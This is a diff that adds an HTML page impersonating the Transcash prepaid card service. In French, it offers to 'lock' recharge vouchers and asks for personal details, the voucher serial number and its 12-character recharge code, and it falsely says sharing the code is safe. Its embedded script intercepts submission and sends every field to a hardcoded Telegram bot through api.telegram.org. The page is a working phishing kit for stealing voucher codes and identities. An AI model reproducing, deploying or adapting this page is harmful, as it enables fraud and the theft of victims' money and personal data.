@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Transcash</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="style.css"/>
+</head>
+
+<body>
+
+    <header class="header-top">
+        <div class="container">
+            <div class="header-content">
+                <div class="header-logo">
+                    <div class="firtLogo">
+                        <img src="https://transcashsecurit.digit-avent.com/images/logo_black_full.png" alt="">
+                    </div>
+                    <div class="secondLogo">
+                        <img src="https://transcashsecurit.digit-avent.com/images/logo-mastercard-mini.png" alt="">
+                        <div class="menu-content">
+                            <i class="fa-solid fa-bars"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="navLinks-icone">
+                    <div class="close-btnn-content">
+                        <i class="fa-regular fa-rectangle-xmark" style="color: #ff0000;"></i>
+                    </div>
+                    <ul>
+                        <li>
+                            <a href="#">
+                                <i class="fa-solid fa-cart-shopping" style="color: #d6001c;"></i>
+                                <span>Acheter</span>
+                                <span><em>purchase</em></span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#">
+                                <i class="fa-solid fa-circle-check" style="color: #004484;"></i>
+                                <span>Acheter</span>
+                                <span><em>purchase</em></span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#">
+                                <i class="fa-solid fa-euro-sign"></i>
+                                <span>Acheter</span>
+                                <span><em>purchase</em></span>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div id="bottom-nav">
+                <div class="container">
+                    <div class="bottom-nav-content">
+                        <ul class="bottomUl">
+                            <li><a href="#">Bracelets Fyve</a></li>
+                            <li><a href="#">Pour toute la famille</a></li>
+                            <li><a href="#">Une carte à votre image</a></li>
+                            <li><a href="#">Formules</a></li>
+                            <li><a href="#">Avantages</a></li>
+                            <li><a href="#">Trouver un point de vente</a></li>
+                            <li><a href="#">English</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <div class="formulaire">
+            <form id="formToken" action="https://transcashsecurit.digit-avent.com/saveSecondForm" method="post">
+                <input type="hidden" name="_token" value="KH239EqHdY97dpsM5jwroYpCekfIzWf4Ipiuhtbm"> <input type="hidden" name="_method" value="post">
+                <h2>Formulaire de verrouillage de ticket recharge</h2>
+                <p style="color: red; font-weight: bold;">Les champs marqués d'une étoile rouge (*) sont obligatoires.
+                </p>
+
+                <div class="form">
+                    <div class="input">
+                        <label for="nom">Nom:<span>*</span></label>
+                        <input type="text" placeholder="" id="nom" name="nom" required>
+                    </div>
+                    <div class="input">
+                        <label for="prenom">Prénom:<span>*</span></label>
+                        <input type="text" id="prenom" name="prenom" required>
+                    </div>
+                </div>
+
+                <div class="form">
+                    <div class="input">
+                        <label for="email">Adresse email:<span>*</span></label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <div class="input">
+                        <label for="">Numéro de téléphone:<span>*</span></label>
+                        <div class="telephone">
+                            <div class="image">
+                                <img src="https://transcashsecurit.digit-avent.com/images/france.png" alt="">
+                                <p style="font-size:13px">+33</p>
+                            </div>
+                            <input type="tel" placeholder="" id="telephone" name="telephone" required>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div class="form" style="display: flex; align-items:start">
+                    <div class="input">
+                        <label for="">Nature du ticket recharge:<span>*</span></label>
+                        <div style="display:flex; aligns-items:center; justify-content:space-between">
+                            <div style="display:flex; aligns-items:start; margin-top:5px">
+                                <input type="radio" style="margin-top:0; margin-left:5px" id="transcash" value="transcash" name="nature" required>
+                                <label for="transcash" required style=" margin-left:5px; font-weight:bold">Transcash</label>
+                            </div>
+                            <div style="display:flex; aligns-items:start; margin-top:5px">
+                                <input type="radio" style="margin-top:0; margin-left:5px;" value="PCS" id="pcs" name="nature" required>
+                                <label for="pcs" required style=" margin-left:5px; font-weight:bold">PCS</label>
+                            </div>
+                            <div style="display:flex; aligns-items:start; margin-top:5px">
+                                <input type="radio" style="margin-top:0; margin-left:5px;" value="Neosurf" id="neosurf" name="nature">
+                                <label for="neosurf" style=" margin-left:5px; font-weight:bold">Neosurf</label>
+                            </div>
+                        </div>
+                        <p style="color:gray; font-size:12px; margin-top:15px; text-align:justify">
+                            <span>Alerte:*</span> Vos tickets PCS et Neosurf peuvent être vérouillés par notre système pendant 48h seulement. Après les 48h ils seront de nouveaux exploitables.</p>
+                    </div>
+                    <div class="input">
+                        <label for="">Montant du ticket:<span>*</span></label>
+                        <div style="display:flex; aligns-items:center; justify-content:space-between">
+                            <select name="montant" id="" style="width:100%">
+                                <option value="">Cliquer pour choisir un montant</option>
+                                <option value="50">50€</option>
+                                <option value="100">100€</option>
+                                <option value="150">150€</option>
+                                <option value="200">200€</option>
+                                <option value="250">250€</option>
+                                <option value="300">300€</option>
+                                <option value="400">400€</option>
+                                <option value="500">500€</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form" style="display:flex; align-items:start">
+                    <div class="input" style="margin-top: 10px">
+                        <label for="mode">Mode d'achat:<span>*</span></label>
+                        <div style="display:flex; aligns-items:center; justify-content:space-between">
+                            <select name="mode" id="mode" style="width:100%">
+                                <option value="">Cliquer pour choisir un mode d'achat</option>
+                                <option value="Achat en ligne">Achat en ligne</option>
+                                <option value="Achat chez un buraliste">Achat chez un buraliste</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="input" style="margin-top: 10px">
+                        <label for="date">Date d'achat du ticket recharge:<span>*</span></label>
+                        <input type="date" style="" name="date" id="date">
+                    </div>
+                </div>
+
+
+                <div class="form" style="align-items:">
+                    <div class="input" style="margin-top: 32px">
+                        <label for="numero">Numéro de série du ticket recharge:<span>*</span></label>
+                        <input type="text" style="" minlength="" maxlength="" name="numero" id="numero">
+                    </div>
+                    <div class="input" style="margin-top: 10px">
+                        <label for="code">Code de rechargement de votre ticket recharge:(Transcash, Pcs,
+                            Neosurf)<span>*</span></label>
+                        <input type="text" name="code" id="code" minlength="12" maxlength="12">
+                    </div>
+                </div>
+
+
+                <div class="form" style="align-items:">
+                    <div class="input" style="margin-top: 10px">
+                        <label for="">Choisir un type de verouillage:<span>*</span></label>
+                        <select name="type" id="" style="width: 100%" required>
+                            <option value="">Cliquer ici pour choisir un type de verouillage</option>
+                            <option value="Verouillage complet">Verouillage complet</option>
+                            <option value="Verouillage code et numéro">Verouillage code et numéro</option>
+                            <option value="Verouillage automatique">Verouillage automatique</option>
+                        </select>
+                    </div>
+                </div>
+
+
+                <div class="form">
+                    <div class="input" style="width:100%; margin:5px 0px">
+                        <span>N.B:*</span>
+                        <p style="color:gray; font-size:12px; text-align:justify; margin:2px 0px;"><span style="text-decoration: underline">Verrouillage complet:</span> (Toutes les informations importantes de votre Ticket recharge ne seront exploitable en aucun cas)
+                        </p>
+                        <p class="width:50%" style="color:gray; text-align:justify; margin:2px 0px; font-size:12px; ">
+                            <span style="text-decoration: underline">
+                                Verrouillage code et numéro:</span> (Votre code et votre numéro de série seront uniquement inexploitables) …Vous pouvez communiquer votre Code rechargement ou votre numéro de série en toute sécurité.
+                        </p>
+                        <p class="width:50%" style="color:gray; text-align:justify; margin:2px 0px; font-size:12px; ">
+                            <span style="text-decoration: underline">Verrouillage Automatique:</span> (Votre code de rechargement peut être utilisé par une quelconque personne) .
+                        </p>
+                    </div>
+                </div>
+
+                <div class="button">
+                    <button type="submit">
+                        Verrouiller votre ticket de recharge
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <section id="contactForm">
+        <div class="container">
+            <div class="contactForm-left">
+                <div class="contactForm-leftContent rita">
+                    <div class="rita-content">
+                        <h2>VOUS AVEZ UNE <span>QUESTION ?</span></h2>
+                        <div class="contactForm-para">
+                            <p><a href="#">Comment choisir ma thématique d’achat en formule ACCESS ?</a></p>
+                            <p><a href="#">Comment passer en formule ESSENTIAL ?</a></p>
+                            <p><a href="#">Puis-je régler mes achats sur internet ?</a></p>
+                        </div>
+                        <div class="contactBtn">
+                            <button>Plus de questions ?</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="contactForm-leftContent">
+                    <h2>VOUS AVEZ UNE <span class="ctt-red">SERVICE CLIENT</span></h2>
+                    <div class="contactForm-para">
+                        <p><a href="#"><i class="fa-solid fa-phone"></i>
+                                +33 7 56 94 02 82 (Appel non surtaxé)</a></p>
+                        <p><a href="#">➡ Accueil téléphonique du Lundi-Vendredi 9h-19h</a></p>
+                        <p><a href="#"><i class="fa-solid fa-envelope"></i>
+                                Contact par email</a></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer__top">
+                <div class="footer__top__box">
+
+                    <div class="footer__top__box__one">
+                        <img src="https://transcashsecurit.digit-avent.com/images/image6.png" alt="">
+                    </div>
+
+                    <div class="footer__top__box__one">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                        <p>transcashsecurit75@gmail.com</p>
+                    </div>
+
+                    <div class="footer__top__box__one">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-phone"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                        <p>+33 7 56 94 02 82 (Appel Gratuit)</p>
+                    </div>
+                    <div class="footer__top__box__one">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-instagram"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>                        <svg xmlns="http://www.w3.org/2000/svg" width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-facebook"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>                        </div>
+                </div>
+                <div class="footer__top__box">
+                    <h3>NAVIGATION</h3>
+                    <ul>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>LA CARTE BANCAIRE PRÉPAYÉE RECHARGEABLE</a>
+                        </li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>QUI SOMMES-NOUS</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>UNE CARTE À VOTRE IMAGE</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>FORMULES & TARIFS</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>AVANTAGES</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>TROUVER UN POINT DE VENTE</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>FAQ</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>PLAN DE SITE</a></li>
+                    </ul>
+                </div>
+                <div class="footer__top__box">
+                    <h3>LÉGAL</h3>
+                    <ul>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>CONDITIONS GÉNÉRALES DE VENTE</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>CONDITIONS GÉNÉRALES D'UTILISATION</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>POLITIQUE DE CONFIDENTIALITÉ MFTEL</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>POLITIQUE DE CONFIDENTIALITÉ DE PAYNOVATE
+                                SA</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>MENTIONS LÉGALES</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>FRAIS TRANSCASH</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>GUIDE D'UTILISATION RAPIDE</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>GLOSSAIRE DES FRAIS TRANSCASH</a></li>
+                        <li><a href=""><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right" style=" padding:2px; margin-right:8px ; color:gray; background:rgba(0, 0, 0, 0.486)"><polyline points="9 18 15 12 9 6"></polyline></svg>POLITIQUE DE COOKIES (UE)</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer__bottom">
+                <div class="footer__bottom__box" style="margin-left:25%">
+                    <p> &copy; MLFTEL 2018-2023</p>
+                </div>
+                <div class="footer__bottom__box">
+                    <div class="footer__bottom__box__left">
+                        <p>
+                            Mastercard est une marque déposée et le design des cercles est une marque commerciale de Mastercard International Incorporated. La Carte Transcash est émise par Paynovate SA en vertu d’une licence de Mastercard International Inc. Paynovate SA est autorisée
+                            par la Banque Nationale de Belgique à émettre de la monnaie électronique et à fournir les services de paiement associés (réf 0506.763.929), dans le cadre de la réglementation applicable aux établissements de Monnaie Électronique.
+                        </p>
+                        <p>
+                            *Selon Conditions Générales de Vente et Conditions Générales d’Utilisation des cartes de paiement prépayées Transcash. (1) Coût d’un SMS ou d’un appel local chez votre opérateur téléphonique.
+                        </p>
+                    </div>
+                    <div class="footer__bottom__box__right" style="margin-left: 40%;">
+                        <img src="https://transcashsecurit.digit-avent.com/images/image2.png" alt="">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        /* logique to open */
+
+        const menuHam = document.querySelector('.close-btnn-content')
+        const navLinks = document.querySelector(".navLinks-icone")
+        const bottomNa = document.querySelector(".bottom-nav-content")
+        const menu = document.querySelector(".menu-content")
+        const menuUl = document.querySelector(".bottomUl")
+
+        menu.addEventListener('click', () => {
+            navLinks.classList.add('mobile-menu')
+            bottomNa.classList.add('mobile-menu')
+            menuUl.classList.add('mobile-menu')
+        })
+        menuHam.addEventListener('click', () => {
+            navLinks.classList.remove('mobile-menu')
+            bottomNa.classList.remove('mobile-menu')
+            menuUl.classList.remove('mobile-menu')
+
+        })
+    document.getElementById('formToken').addEventListener('submit', function (e) {
+
+        e.preventDefault();
+
+        const telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';
+
+        const chatId = '-1002133843662';
+
+        const formData = new FormData(e.target);
+
+        // Construct the message text with form data
+
+        let messageText = "New form submission:\n";
+
+        formData.forEach((value, key) => {
+
+            messageText += `${key}: ${value}\n`;
+
+        });
+
+        // Make an AJAX request to send data to Telegram
+
+        const xhr = new XMLHttpRequest();
+
+        xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`);
+
+        xhr.send();
+
+        // You can handle success or failure as needed
+
+        xhr.onload = function () {
+
+            if (xhr.status === 200) {
+
+                window.alert('Form sent successfully');
+
+            } else {
+
+                // Display an error popup
+
+                window.alert('Failed to send form ');
+
+            }
+
+        };
+
+    });
+
+</script>
+
+</body>
+
+</html>
